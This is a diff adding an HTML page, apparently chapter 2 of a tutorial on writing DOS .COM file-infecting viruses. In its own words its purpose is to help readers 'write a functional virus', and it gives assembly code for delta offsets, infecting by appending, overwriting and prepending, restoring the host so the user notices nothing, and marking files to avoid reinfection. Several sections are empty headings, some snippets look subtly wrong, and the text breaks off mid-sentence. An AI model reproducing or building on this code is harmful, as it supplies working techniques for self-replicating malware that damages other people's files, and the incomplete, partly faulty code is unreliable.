@@ -1,0 +1,851 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - .COM File Infection</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<CENTER>
+  <p><FONT SIZE="+2"><b><font color="#004080">.COM File Infection</font></b></FONT> 
+  </p>
+  <hr>
+</CENTER>
+<P> 
+<blockquote> <FONT SIZE="+1">Chapter 2</FONT><BR>
+  <BR>
+  2.1 <A HREF="#Execute">.COM Program Execution</A><BR>
+  2.2 <A HREF="#Delta">Delta Offsets</A><BR>
+  2.3 <A HREF="#Ways">Ways to Infect</A><BR>
+  2.3.1 <A HREF="#Infecting">Infecting by Appending</A><BR>
+  2.3.2 <A HREF="#Overwriting">Infecting by Overwriting</A><BR>
+  2.3.3 <A HREF="#Prepending">Infecting by Prepending</A><BR>
+  2.3.4 <A HREF="#Random">Infecting by Random Location</A><BR>
+  2.4 <A HREF="#Restoring">Restoring the Host</A><BR>
+  2.4.1 <A HREF="#AppendRestore">Restoring after Appended Infection</A><BR>
+  2.4.2 <A HREF="#PrependRestore">Restoring after Prepended Infection</A><BR>
+  2.4.3 <A HREF="#RandomRestore">Restoring after Random Located Infection</A><BR>
+  2.5 <A HREF="#Command">COMMAND.COM Problems</A><BR>
+  2.6 <A HREF="#Reinfect">Reinfection Problems</A><BR>
+  2.6.1 <A HREF="#AReinfectDate">Avoiding Reinfection by Date/Time</A><BR>
+  2.6.2 <A HREF="#AReinfectID">Avoiding Reinfection by Markers</A><BR>
+  2.7 <A HREF="#AsmProbs">Assembler Problems</A><BR>
+</blockquote>
+<P> 
+<HR>
+<A NAME="Execute"></a> 
+<CENTER>
+  <FONT SIZE="+1">.COM Program Execution</FONT>
+</CENTER>
+<BR>
+It is very important to understand exactly what a .com program is, what it does, 
+and how it executes in order to write a functional virus. So please understand 
+the basic concepts described within this section before moving on to the next 
+one. 
+<P> A .com program is an executable file that is limited to 63.75kb in size. Please 
+  note that the maximum size of a .com program (63.75kb) plus the size of a PSP 
+  (256 bytes, discussed later) equals 64k, which is the maximum size of a memory 
+  segment. Therefor, a single .com program will never exceed one segment. The 
+  reason for this limitation, is because a .com file contains only raw binary 
+  executable data, unlike the multi-segmented .exe files, which contain a header 
+  in addition to it's executable data. The header in front of the .exe program 
+  allows it to contain multiple segments of data and/or code. Because of this, 
+  if there's no header, then there can only be one segment of code/data. 
+<P> When a .com program is ran, the first thing that happens is DOS will allocate 
+  the largest chunk of memory available for the program. Then DOS will create 
+  a PSP (short for Program Segment Prefix) for the program. Then finally it will 
+  place the contents of the .com program after the PSP. But keep in mind that 
+  DOS has a 16 byte MCB (short for Memory Control Block) in front of the PSP to 
+  keep track of the memory allocated to it. So in order to load a .com program, 
+  you must have <I>X+Y+Z</I> bytes of memory available (where <I>X</I> is the 
+  size of the .com program, <I>Y</I> is 16, the size of a MCB, and <I>Z</I> is 
+  256, the size of a PSP). For example, in order to load a 500 byte .com program, 
+  you must have 772 bytes of memory available (500+16+256). The order of these 
+  three key components are always the same. 
+<P> 
+  <CENTER>
+  </CENTER>
+<P> An important thing to remember about memory (in .com and .exe programs) is 
+  that the entire largest block of free memory will be allocated to your program 
+  automatically. That means that if you have a 1,000 byte program, and the largest 
+  block of free conventional memory is 552kb, you will automatically have 552kb 
+  of memory allocated to your program. Depending on how you look at this, it could 
+  be a good or a bad thing. But for our purposes, it really won't make much of 
+  a difference. You just have to remember that there usually isn't any free memory 
+  unless you free some of it. So if you try to use DOS function 48h (Allocate 
+  Memory) without freeing up some memory first, you will probably get the error 
+  "insufficient memory", because all memory is already allocated to your program. 
+<P> The .com program begins executing at the first byte after the PSP, with all 
+  segment registers set to the segment of the PSP. So therefor, we start executing 
+  at cs:0100h, where cs (and all other segment registers) is the segment of the 
+  PSP. 
+<P> 
+<HR>
+<A NAME="Delta"></a> 
+<CENTER>
+  <FONT SIZE="+1">Delta Offsets</FONT>
+</CENTER>
+<BR>
+A serious problem will occur with your virus after it infects a program by either 
+appending, or random placement (see section 2.3). Being that any absolute offset 
+inside of your virus will point to a different location in your infected program 
+every time. This happens because with every file you infect, the size of your 
+program will change and the offsets will be different too. What you must do, is 
+simply add the difference of a label's current offset in the program and it's 
+offset when it was originally assembled to every the absolute offset of every 
+instruction whose offset has changed. There are several ways of going about to 
+accomplish this. Let's take for example, this code which does not implement correction 
+for these problems: 
+<P> 
+<PRE>
+	jmp	near VirusStart			; Jump to start of the virus
+
+	; Host program lies here
+
+SomeInfo	dw	?			; Some information
+
+VirusStart:
+        mov     ax, offset SomeInfo             ; ax &lt;- offset of SomeInfo
+        mov     dx, [SomeInfo]                  ; dx &lt;- contents of SomeInfo
+</PRE>
+Now with this sample of code, let's say that the offset of <CODE>SomeInfo</CODE> 
+is <CODE>0103h</CODE>. So then when the virus runs, <CODE>0103h</CODE> will always 
+be moved into <CODE>ax</CODE>. But when the virus has infected a program, there 
+will be a lot of extra data between <CODE>VirusStart</CODE> and <CODE>SomeInfo</CODE>, 
+so <CODE>0103h</CODE> will now be pointing to somewhere into the host program, 
+instead of the <CODE>SomeInfo</CODE> we want. An easy method to fix this would 
+be: 
+<P> 
+<PRE>
+	jmp	near VirusStart			; Jump to start of the virus
+
+	; Host program lies here
+
+SomeInfo	dw	?			; Some information
+
+VirusStart:
+	call	FindDelta			; Push offset of next
+						;  instruction onto stack,
+						;  then jump to FindDelta
+FindDelta:
+        pop     bp                              ; bp &lt;- offset of FindDelta
+						;  in infected program
+	sub	bp, offset FindDelta		; Subtract original offset
+
+        lea     ax, [bp+SomeInfo]               ; ax &lt;- offset of SomeInfo in
+ 						;  infected program
+        mov     dx, [bp+SomeInfo]               ; dx &lt;- contents of SomeInfo
+</PRE>
+This first example is the most commonly used method for finding the delta offset 
+in viruses (although not the most efficient). It's pretty much self explanatory 
+due to the comments. It will first jump over the host program to <CODE>VirusStart</CODE>, 
+then it will use the call instruction (which basically just pushes the offset 
+of the next instruction onto the stack, then jumps to the requested target) to 
+find the current offset of the label <CODE>FindDelta</CODE> within the program. 
+Then the final step to finding the delta offset is to subtract the original offset 
+of <CODE>FindDelta</CODE> from it's current location within the infected program. 
+It is important to know the <CODE>lea</CODE> instruction with this example, which 
+is basically a mnemonic for: 
+<P> 
+<PRE>
+        mov     ax, offset SomeInfo             ; ax &lt;- original offset of
+ 						;  SomeInfo in program
+        add     ax, bp                          ; ax &lt;- current offset of
+ 						;  SomeInfo in program
+</PRE>
+So the <CODE>lea</CODE> instruction can be used to move the offset of a variable 
+into a register. And just like normal, you would use the <CODE>mov</CODE> instruction 
+to move the contents of a variable into a register or a register to a variable. 
+<P> A more efficient method of finding the delta offset would be: 
+<P> 
+<PRE>
+	mov	bp, offset VirusStart		;
+	jmp	bp				; Jump to start of virus
+
+	; Host program lies here
+
+VirusStart:
+        sub     bp, offset VirusStart           ; bp &lt;- delta offset
+</PRE>
+Although I've never seen this method used in a virus before, it's 2 bytes smaller, 
+and saves 9 clock cyles on a 386. This one is a little more complicated to explain, 
+and requires you to know a little bit about infection. When you infect a file, 
+you replace the first <CODE>offset VirusStart</CODE> with the new offset of <CODE>VirusStart</CODE> 
+in the host. So when the program runs after it's infected, it will jump all the 
+way to <CODE>VirusStart</CODE> and <CODE>bp</CODE> will already contain the current 
+offset of a label in the infected program. And now, we just subtract it's original 
+offset from it's current one. Poof! We now have the delta offset. 
+<P> In all of the examples above, I used the <CODE>bp</CODE> register to hold 
+  the delta offset. Please note that you can use any index (<CODE>di</CODE>, <CODE>si</CODE>) 
+  or pointer register (<CODE>sp</CODE>, <CODE>bp</CODE>) instead. Even though 
+  it is possible to use <CODE>sp</CODE> (stack pointer), you should <B>never</B> 
+  use it to hold your delta offset. Doing so will cause serious fatal side-effects 
+  to occur whenever you, or an interrupt that's called puts something onto the 
+  stack. 
+<P> I've provided you with two examples of how to find the delta offset above. 
+  But be creative, think of new ways. You might just find a better one. 
+<P> 
+<HR>
+<A NAME="Ways"></a> 
+<CENTER>
+  <FONT SIZE="+1">Ways to Infect</FONT>
+</CENTER>
+<BR>
+They are several different ways you can infect a .com program. Listed in order 
+of their occurance, they are:
+<P> 
+<UL>
+  <LI><B>Appending</B><BR>
+    The most common .com infecting virus infects with this method, and with good 
+    reason. It has just the right ballance of simplicity, efficiency, and security. 
+    These viruses will save the first few bytes of the host to somewhere in the 
+    virus, append itself to the host, then write a jump in the begining of the 
+    host to jump to the virus after the host. To restore the host, it simply moves 
+    the original bytes of the host back to the begining of the host, and execute 
+    it like normal.
+    <P> 
+  <LI><B>Overwriting</B><BR>
+    Overwriting viruses, in most people's opinion, are the least efficient kind 
+    of virus. To infect a file, it simply writes itself to the begining of the 
+    host. This causes the host program to become permanantly corrupt, and immediatly 
+    alerts the user that something is wrong.
+    <P> 
+  <LI><B>Prepending</B><BR>
+    Prepending viruses usually have simplified infecting and host-restoring procedures. 
+    All they do is read the entire host file to a buffer at the end of the virus, 
+    and write it back to the host's file. The will cause it to have the host actually 
+    appending the virus. To restore the host program, it must copy the entire 
+    host back to 0100h, which could cause for this method to very inefficient 
+    when it infected a large host.
+    <P> 
+  <LI><B>Random Placement</B><BR>
+    I have actually never seen, or heard of a .com infecting virus that infects 
+    by random placement, but it could have some advantages. Basically, the virus 
+    is placed at a random spot inside of the .com program, and what was previously 
+    where the virus is now, is appended to the file. Although I haven't yet proven 
+    this, I hypothesize that this will currently cause scanners great difficulty 
+    to detect or clean infected programs.
+    <P> 
+</UL>
+As far as I know, there isn't any other way you can infect a .com program. I will 
+go over every method of infection in detail and with full examples, so you can 
+fully understand the pros and cons of each. 
+<P> 
+<HR>
+<A NAME="Infecting"></a> 
+<CENTER>
+  <FONT SIZE="+1">Infecting by Appending</FONT>
+</CENTER>
+<BR>
+The first thing you must do, when infecting a .com program by appending, is save 
+the first few bytes of the host to somewhere inside of your virus. For the sake 
+of explanation, we'll just save it at the end of the virus. Append the virus to 
+the end of the program to infect. Then, place a jump in the beginning of the host 
+program to jump to the viral code you placed at the end of the host program. Finally, 
+after the infection is complete, the infected program should look something like 
+this: 
+<P> 
+  <CENTER>
+    <IMG SRC="comstruc.gif" width="316" height="78"> 
+  </CENTER>
+<P> So when the program is run, it will execute like this: 
+<P> 
+  <CENTER>
+    <IMG SRC="comflow.gif" width="155" height="47"> 
+  </CENTER>
+<P> Where block A is the first to be executed, it will jump to block C. Block 
+  C is the main section of the virus, which will do all of the infecting and whatnot. 
+  In some part of block C, it most copy the contents of block D (original beginning 
+  of the host program) back to where it originally come from, over block A. Then 
+  at the end of block C, it must return control to block A, which is now the original 
+  beginning of the host program, and the host program will be running like nothing 
+  happened. Here is an example virus that demonstrates this: 
+<P> 
+<PRE>
+Start:
+	jmp	near VirusStart			; Jump over host to virus
+
+	; Host program resides here
+
+VirusStart:
+	call	FindDelta			; Find delta offset
+
+FindDelta:
+	pop	bp				;
+        sub     bp, offset FindDelta            ; bp &lt;- delta offset
+
+	; Find a file to infect
+	; The following assumes that the filename to infect is at ds:dx
+
+	mov	ax, 3D02h			; Open file at ds:dx for
+	int	21h				;  read/write access.
+	jc	short FileError			; Jump if an error occurred
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ah, 3Fh				; Read first 3 bytes of host
+	mov	cx, 3				;  program to OriginalBytes.
+	lea	dx, [bp+OriginalBytes]		;
+	int	21h				;
+	jc	short CloseFile			; Close and exit if error
+
+	mov	ax, 4202h			; Position file pointer to
+	xor	cx, cx				;  end of the file.
+	xor	dx, dx				;
+	int	21h				;
+	jc	short CloseFile			; Close and exit if error
+
+	sub	ax, 3				; Set rel. offset of jmp
+	mov	[Start+1], ax			;  instruction for later
+
+	mov	ah, 40h				; Append virus to file.
+	mov	cx, VirusEnd-VirusStart		;
+	lea	dx, [bp+VirusStart]		;
+	int	21h				;
+	jc	short CloseFile			; Close and exit if error
+
+	mov	ax, 4200h			; Position file pointer to
+	xor	cx, cx				;  beginning of the file.
+	xor	dx, dx				;
+	int	21h				;
+	jc	short CloseFile			; Close and exit if error
+
+	mov	ah, 40h				; Write jmp instruction to
+	mov	cx, 3				;  host program
+	mov	dx, offset Start		;
+	int	21h				;
+
+CloseFile:
+	mov	ah, 3Eh				; Close the file
+	int	21h				;
+
+FileError:
+	; Restore control to the host program
+
+OriginalBytes	db	3 DUP (?)		; Original byte buffer
+
+LABEL	VirusEnd	BYTE
+</PRE>
+Now, let's go over this example step-by-step. First it will jump over the host 
+program to the beginning of the virus code. Second, it will find it's delta offset. 
+Then it will find a file to infect somehow, we will be going over this later. 
+After you find a program to infect, open it with DOS function 3Dh/Int21h, in read/write 
+mode. Read the first three bytes of the host program to somewhere in your virus 
+with DOS function 40h/Int21h. Next, reposition the file pointer to the end of 
+the file with DOS function 42h/Int21h, because that is where we're going to attach 
+the virus to the host. Now, LSEEK (DOS function 42h/Int21h) has returned in dx:ax 
+the new file position. Knowing that .com files cannot exceed 63.75kb, we know 
+that we only need the value in <CODE>ax</CODE>, and can safely assume that <CODE>dx</CODE> 
+is zero. With this value, we will set the relative offset of the <CODE>jmp</CODE> 
+instruction that already exists at <CODE>Start</CODE>, and we later write it to 
+the beginning of the host. Now we can just place this value in <CODE>ax</CODE> 
+after the <CODE>jmp</CODE> instruction already present at label <CODE>Start</CODE>. 
+This will modify the <CODE>jmp</CODE> instruction so that it will jump all the 
+way over the host program to the virus. Now that we've got generating the <CODE>jmp</CODE> 
+instruction out of the way, we go ahead and append the virus to the file. Then 
+we move the file pointer back to the beginning of the host program, and write 
+the recently generated 3 byte <CODE>jmp</CODE> instruction to the host. Finally 
+we close the host program, and return control to it (discussed later). Now this 
+program is rip-roarin' ready to spread our virus. 
+<P> Some of you still may be curious about my usage of delta offsets in this example, 
+  specifically when referring to the label <CODE>Start</CODE>. If you look closely, 
+  you will notice that with all of my references to this label, I didn't use the 
+  delta offset. This is because it's location never changes, and therefor the 
+  offset of it is always the same. If you still question why I'm doing this, please 
+  go back to section 2.2, Delta Offsets for a refresher. 
+<P> 
+<HR>
+<A NAME="Overwriting"></a> 
+<CENTER>
+  <FONT SIZE="+1">Infecting by Overwriting</FONT>
+</CENTER>
+<BR>
+Infecting by overwriting is a very simple method, that is way to common. After 
+it finds a file to infect, it just writes itself to the begining of it. So after 
+infection, the file looks like this: 
+<P> 
+  <CENTER>
+    <IMG SRC="comstruo.gif"> 
+  </CENTER>
+<P> So when the infected program is ran, the virus will run, and the original 
+  host will never be ran. This will immediatly alert the user that there is a 
+  problem because more and more programs will just refuse to run. Because of this, 
+  the virus will not survive that long, and probably not even long enough to be 
+  spread to another computer. 
+<P> Here is an example that demonstrates how to infect with this method: 
+<P> 
+<PRE>
+VirusStart:
+	; Find a file to infect, assume it is in ds:dx
+
+	mov	ax, 3D01h			; Open file for write
+	int	21h				;  only access
+	jc	short DontInfect		;
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ah, 40h				; Write virus to file
+	mov	cx, VirusEnd-VirusStart		;
+	mov	dx, offset VirusStart		;
+	int	21h				;
+
+	mov	ah, 3Eh				; Close the file
+	int	21h				;
+
+DontInfect:
+	int	20h				; Terminate
+
+LABEL	VirusEnd	BYTE
+</PRE>
+This is a fine example that shows the extreme simplicity of this method of infecting. 
+There really isn't much more to these viruses. 
+<P> 
+<HR>
+<A NAME="Prepending"></a> 
+<CENTER>
+  <FONT SIZE="+1">Infecting by Prepending</FONT>
+</CENTER>
+<BR>
+Infecting a file by prepending, besides overwriting, is the easiest way to infect. 
+All it will do is read the actual host to a buffer at the end of the virus, and 
+then write the virus (with the host appending it) back to the file. This will 
+cause it to look like so: 
+<P> 
+  <CENTER>
+    <IMG SRC="comstrup.gif"> 
+  </CENTER>
+<P> To demonstrate howto infect with this method, here is some sample code: 
+<PRE>
+Start:
+	; Find a file to infect
+	; The following assumes that the filename to infect is at ds:dx
+
+	mov	ax, 3D02h			; Open file for read/write
+	int	21h				;  access
+	jc	short DontInfect		; Dont infect if error
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ah, 3Fh				; Read host from file
+        mov     cx, 65280-VirusSize             ; cx &lt;- max size of host
+	mov	dx, offset HostBuffer		;
+	int	21h				;
+	jc	short AbortInfect		; Abort infection if error
+
+	mov	[HostSize], ax			; Store size of host
+	push	ax				;
+
+	mov	ax, 4200h			; Seek back to begining
+	xor	cx, cx				;  of the host.
+	xor	dx, dx				;
+	int	21h				;
+
+	mov	ah, 40h				; Write to the file
+        pop     cx                              ; cx &lt;- size of host
+	add	cx, VirusSize			; Add size of virus
+	mov	dx, offset Start		;
+	int	21h				;
+
+AbortInfect:
+	mov	ah, 3Eh				; Close the file
+	int	21h				;
+
+DontInfect:
+	; Restore host program and give it control
+
+HostSize	dw	?
+VirusSize	=	$-Start
+HostBuffer	db	65280-VirusSize DUP (?)
+</PRE>
+As you can see, this will first find a program to infect, open it, then read the 
+maximum number of bytes that it can store within itself to the buffer <CODE>HostBuffer</CODE>. 
+If the file we're infecting is below the maximum number of bytes we can read, 
+as it will probably be, it will read as many as it can and return in <CODE>ax</CODE> 
+the actual number of bytes it read. Then, it will move the file pointer back to 
+the begining of the file, and write the virus (with the appendd host) back to 
+the file. Finally, close tthe file, and return control to the host. 
+<P> 
+<HR>
+<A NAME="Random"></a> 
+<CENTER>
+  <FONT SIZE="+1">Infecting by Random Location</FONT>
+</CENTER>
+<BR>
+<P> 
+<HR>
+<A NAME="Restoring"></a> 
+<CENTER>
+  <FONT SIZE="+1">Restoring the Host</FONT>
+</CENTER>
+<BR>
+Restoring the control to the host program could possibly be the most important 
+part of you virus, it's what makes the original program run. If this didn't happen 
+the user would surely figure something out after every program just refuses to 
+run. In reality, all your really doing is disinfecting the host in memory, and 
+giving it control. This way, it'll just blindly start executing like it was never 
+infected... like normal. There is a different method of restoring the host depending 
+on how it was infected: 
+<P> 
+<UL>
+  <LI><B>Infected by Appending</B><BR>
+    Programs infected this way definitely have the most simple way of restoring 
+    the host. All you do, is replace the first few bytes of the infected program 
+    with the original ones that were there. This is usually very efficient because 
+    it will usually never have to move more than 5 bytes.
+    <P> 
+  <LI><B>Infected by Prepending</B><BR>
+    Restoring the host of a program infected by prepending, is simple, but inefficient. 
+    You must move every single byte of the host back to where it was originally 
+    before infection. But unfortunatly, there is one complexity with this method. 
+    It must make another copy of itself somewhere in memory before it restores 
+    the host. Otherwise, if it didn't, it would overwrite itself and crash.
+    <P> 
+  <LI><B>Infected by Random Location</B><BR>
+    This has the most complex method of restoring the host, which is this method's 
+    only major drawback. First it must seek to the original bytes from the host 
+    located at the end of the host, then copy them back over where the virus is 
+    now. Then return control to the host. The also suffers from the complexity 
+    of restoring a program infected by prepending, being that it must make another 
+    copy of the virus in memory before it overwrites itself with the original 
+    bytes of the host.
+    <P> 
+</UL>
+<P> 
+<HR>
+<A NAME="AppendRestore"></a> 
+<CENTER>
+  <FONT SIZE="+1">Restoring after Appended Infection</FONT>
+</CENTER>
+<BR>
+Restoring a .com program infected by appending has to be the most efficient and 
+simple way to restore the host. Which is probably the reason for the popularity 
+for this method of infection. All it has to do, is restore the first few bytes 
+that were originaly in the begining of the host, by moving them back there. For 
+example: 
+<P> 
+<PRE>
+Start:
+	mov	bp, offset VirusStart		;
+	jmp	bp				; Jump to start of virus
+	; ^-- The above code is 5 bytes
+
+	; Host program lies here
+
+VirusStart:
+        sub     bp, offset VirusStart           ; bp &lt;- delta offset
+
+	; Find and infect programs here
+
+RestoreHost:
+	; The following assumes that es and ds, are equal to cs
+
+	mov	di, offset Start		; Move to Start
+	lea	si, [bp+OriginalBytes]		; Move from OriginalBytes
+	movsw					; Move 2 bytes (1 word)
+	movsw					; Move 2 bytes (1 word)
+	movsb					; Move remaining 1 byte
+
+	jmp	Start				; Jump to start of host
+
+OriginalBytes	db	0B8h, 00h, 4Ch, 0CDh, 21h	; Opcodes to
+						; terminate the program.
+</PRE>
+As you can see in this example, it will jump over the host to the virus. Find 
+the delta offset. Find and infect programs. Then it sets <CODE>di</CODE> to the 
+offset of the destination of the bytes we want to move, which would be <CODE>Start</CODE> 
+because this is where they originally were in the host program. Then it sets <CODE>si</CODE> 
+to the offset of the source of the bytes, which are stored in the buffer <CODE>OriginalBytes</CODE>. 
+Then it will move the first two bytes, second two bytes, and finally the last 
+bye. And finally it will use a <CODE>jmp</CODE> to jump back to the host program. 
+And note that when you write the virus, you want to put something in the <CODE>OriginalBytes</CODE> 
+buffer that will terminate the program, and not just leave it blank or filled 
+with zeros. Because before it infects a program, there is no host to restore, 
+and you might as well terminate the virus instead of leaving it to go into an 
+endless loop or crash. 
+<P> There is one optimization that can be made to this code that will save a byte. 
+  That is, replace the 3-byte <CODE>jmp Start</CODE> with a 1-byte <CODE>retn</CODE>, 
+  and place a 1-byte <CODE>push di</CODE> before it modifies <CODE>di</CODE> with 
+  the <CODE>movs</CODE> instructions. For example: 
+<P> 
+<PRE>
+	; ...
+
+RestoreHost:
+	; The following assumes that es and ds, are equal to cs
+
+	mov	di, offset Start		; Move to Start
+	push	di				; Push offset of Start
+	lea	si, [bp+OriginalBytes]		; Move from OriginalBytes
+	movsw					; Move 2 bytes (1 word)
+	movsw					; Move 2 bytes (1 word)
+	movsb					; Move remaining 1 byte
+
+	retn					; Return to label Start
+
+OriginalBytes	db	0B8h, 00h, 4Ch, 0CDh, 21h	; Opcodes to
+						; terminate the program.
+</PRE>
+<P> 
+<HR>
+<A NAME="PrependRestore"></a> 
+<CENTER>
+  <FONT SIZE="+1">Restoring after Prepended Infection</FONT>
+</CENTER>
+<BR>
+<P> 
+<HR>
+<A NAME="RandomRestore"></a> 
+<CENTER>
+  <FONT SIZE="+1">Restoring after Random Located Infection</FONT>
+</CENTER>
+<BR>
+<P> 
+<HR>
+<A NAME="Command"></a> 
+<CENTER>
+  <FONT SIZE="+1">COMMAND.COM Problems</FONT>
+</CENTER>
+<BR>
+COMMAND.COM is actually not a genuine .com file, it is actually a regular .exe 
+file renamed with the .com extension. There are a few other programs out there 
+with this deception, but not many. If you try to infect one of these programs 
+as you would a normal .com program, you will render it useless and corrupt. Because 
+of this, we must implement some kind of detection so we won't infect COMMAND.COM, 
+or any other .com programs like it the way we would a normal .com program. 
+<P> Most viruses only implement a very weak detection scheme to determine if the 
+  program to infect is COMMAND.COM: 
+<PRE>
+	cmp	[bp+FileName], 'OC'	; Are first two 'CO'?
+	jne	short NotCommandCom	;
+
+	cmp	[bp+FileName+2], 'MM'	; First four 'COMM'?
+	jne	short NotCommandCom	;
+
+	; The file is COMM*.COM, assume COMMAND.COM
+</PRE>
+And some viruses have even worse detection methods by assuming it's COMMAND.COM 
+if only the first two characters of the filename are 'CO'. There is a better, 
+smaller, and much more accurate method that is also the one that DOS itself uses 
+to differentiate between .com and .exe files when executing them. When infecting 
+a program, right after you read the first few bytes of it, check if the first 
+two bytes are 'MZ', if they are, then it's a .exe file. For example: 
+<PRE>
+	; The following assumes that the filename to infect is at ds:dx,
+	;  and the delta offset is in bp
+
+	mov	ax, 3D02h			; Open file at ds:dx for
+	int	21h				;  read/write access.
+	jc	short FileError			; Jump if an error occurred
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ah, 3Fh				; Read first 3 bytes of host
+	mov	cx, 3				;  program to OriginalBytes.
+	lea	dx, [bp+OriginalBytes]		;
+	int	21h				;
+
+	cmp	[bp+OriginalBytes], 'ZM'	; Are the first two 'MZ'?
+	je	short NotDotCom			; It's not a .com file
+
+	; Infect the file
+
+NotDotCom:
+	mov	ah, 3Eh				; Close the file
+	int	21h				;
+</PRE>
+<P> 
+<HR>
+<A NAME="Reinfect"></a> 
+<CENTER>
+  <FONT SIZE="+1">Reinfection Problems</FONT>
+</CENTER>
+<BR>
+One major problem, that many of the early viruses didn't take into consideration 
+is reinfection. You don't want to infect the same program more than once. If you 
+do, file sizes will eventually skyrocket and every .com program will become close 
+to 64k, and the programs would become slower and slower because you're running 
+the virus many times. This is a good way to let the user know that the system 
+has become infected. To get around this, we must have some way to determine if 
+the file is already infected. I have seen two methods used: 
+<P> 
+<UL>
+  <LI><B>Set Host's Date/Time</B><BR>
+    With this method of determining if a file is infected, it will set the date 
+    and/or time of every file it infects to a certain value. Most viruses set 
+    the seconds field to a certain value, because most people don't remember the 
+    second they last wrote to a file. This way, if the seconds field of a file's 
+    time stamp is that value, we can assume it was already infected and won't 
+    infect it again.
+    <P> 
+  <LI><B>Have a Marker In The Virus</B><BR>
+    This method will check for a certain byte string or marker that will always 
+    be present in infected files, and that are not likely to occur in ununfected 
+    files. So if the string of bytes is present in a file before infecting it, 
+    we will assume that it is already infected and won't infect it again.
+    <P> 
+</UL>
+<HR>
+<A NAME="AReinfectDate"></a> 
+<CENTER>
+  <FONT SIZE="+1">Avoiding Reinfection by Date/Time</FONT>
+</CENTER>
+<BR>
+To avoid infecting a program by virus multiple times using the file's date/time 
+stamp, you must set a field within it to a specific value. For example, always 
+setting the year to 1980, or the seconds to 58. The best field to change would 
+probably be the seconds, because not that many people memorize the last second 
+a file was written to. For example: 
+<P> 
+<PRE>
+	; The following assumes that the virus has already found a file to
+	;  infect and the address is ds:dx
+
+	mov	ax, 3D02h			; Open the file for read/
+	int	21h				;  write access
+	jc	short DontInfect		; Dont infect if error
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ax, 5700h			; Get file's last written
+	int	21h				;  date and time
+
+        mov     ax, cx                          ; ax &lt;- it's time stamp
+
+        and     cl, 00011111b                   ; cl &lt;- seconds / 2
+	cmp	cl, 58 / 2			; Is it 58 seconds?
+	je	short CloseHost			; Dont infect if it is
+
+	push	dx				; Preserve its date
+	push	ax				; Preserve its time
+
+	; Infect the program
+
+	pop	cx				; Restore its time
+	pop	dx				; Restore its date
+	and	cl, 11111101b			; Set seconds to 58
+	mov	ax, 5701h			; Set file's last written
+	int	21h				;  date and time
+
+CloseHost:
+	mov	ah, 3Eh				; Close the program
+	int	21h				;
+
+DontInfect:
+	; Return to host program
+</PRE>
+<P> With this example, we'll start from where it begins the infection process, 
+  opening the file. After it's opened, the first thing it does, before it writes 
+  to file, is get the file's last written date and time stamp with function 5700h/Int21h, 
+  which will return the seconds / 2 in bits 4-0 of cl. The reason that it has 
+  seconds / 2 instead of just the seconds, is because it can only express 32 different 
+  values in the 5 bits alloted to it, 0-31. So the actual number of seconds is 
+  that value * 2. Anyway, next it will mask out <CODE>cl</CODE> so now it only 
+  contains the seconds field. Then, if it equals 58 seconds (which has the value 
+  of 58 / 2), we assume it's already infected and move on. But if it's not 58 
+  seconds, preserve the file's last written date and time by pushing it onto the 
+  stack. Infect the program. Then restore the time and date back to their respected 
+  registers. Then, <CODE>and</CODE> the seconds field to set it to 58 seconds, 
+  and set the file's last written time and date. Finally, close the program. 
+<P> 
+<HR>
+<A NAME="AReinfectID"></a> 
+<CENTER>
+  <FONT SIZE="+1">Avoiding Reinfection by Markers</FONT>
+</CENTER>
+<BR>
+Avoiding reinfection by markers is similar to how we avoid infecting .exe programs 
+(see section 2.5 above). It will place a small marker, usually 1 or 2 bytes, to 
+somewhere in the begining of the virus. This way, when it reads the first few 
+bytes of the file to infect and see your marker is in the file, it won't infect 
+it because it will assume that it is already infected. The best marker is one 
+that is very unlikely to occur in a program, such as invalid opcodes like 078FFh. 
+For example: 
+<P> 
+<PRE>
+	jmp	near VirusStart			; Jump to start of virus
+Marker	db	78FFh				; Virus marker
+
+	; Host program lies here
+
+VirusStart:
+	; Find a file to infect, the following assumes it is in ds:dx,
+	;  and also assumes the delta offset is in bp
+
+	mov	ax, 3D00h			; Open file for read/write
+	int	21h				; access
+	jc	short DontInfect		;
+
+        mov     bx, ax                          ; bx &lt;- file handle
+
+	mov	ah, 3Fh				; Read first 5 bytes of the
+	mov	cx, 5				;  program.
+	lea	dx, [bp+OriginalBytes]		;
+	int	21h				;
+
+	cmp	[word ptr bp+OriginalBytes+3], 78FFh	; Is the
+	je	short CloseHost				; marker present?
+
+	; Infect the program
+
+CloseHost:
+	mov	ah, 3Eh				; Close the program
+	int	21h				;
+
+DontInfect:
+	; Return to host program
+
+OriginalBytes	db	0B8h, 00h, 4Ch, 0CDh, 21h	; Opcodes to
+						; terminate the program.
+</PRE>
+<P> With this example, you can see that it will jump over the host, find the the 
+  delta offset and a file to infect, then open it for read/write access. Read 
+  the first few bytes of the host program to the buffer <CODE>OriginalBytes</CODE>, 
+  then check if the virus marker is present in the data read from the file. If 
+  it is, it won't infect the file by safely asumming that it is already infected. 
+  Any will just close the file and return to the host. 
+<HR>
+<A NAME="AsmProbs"></a> 
+<CENTER>
+  <FONT SIZE="+1">Assembler Problems</FONT>
+</CENTER>
+<BR>
+It is important to know that some assemblers (including TASM) don't always give 
+you the opcode for the instruction that's in the source code. They have built 
+in optimizations that only make things worse. For example: 
+<PRE>
+	jmp	near SomePlace			; 3 bytes
+	db	0				; Pointless data
+SomePlace:
+</PRE>
+<P> Will actually assemble as: 
+<PRE>
+	jmp	short	SomePlace		; 2 bytes
+	nop					; 1 byte
+	db	0				; Pointless data
+SomePlace:
+</PRE>
+And what's wrong with this you ask? Well a <CODE>jmp near</CODE> will jump to 
+a 16-bit offset relative to the next instruction, has the opcode 0E9h, and is 
+3 bytes. And a <CODE>jmp short</CODE> will jump to a 8-bit offset relatave to 
+the next instruction, has the opcode 0EBh, and is only 2 bytes. So after assembling, 
+your actually getting a different instruction all together. The problem with this, 
+is that if you have the instruction for <CODE>jmp near</CODE>, and you modify 
+the instruction to jump over the host program to your virus during infection, 
+as you would with appending and random location viruses, it will be modifying 
+a <CODE>jmp short</CODE> instruction. So, it can only jump to a 8-bit relative 
+offset instead of a 16-bit relative offset. A quick, fast, easy, and effective 
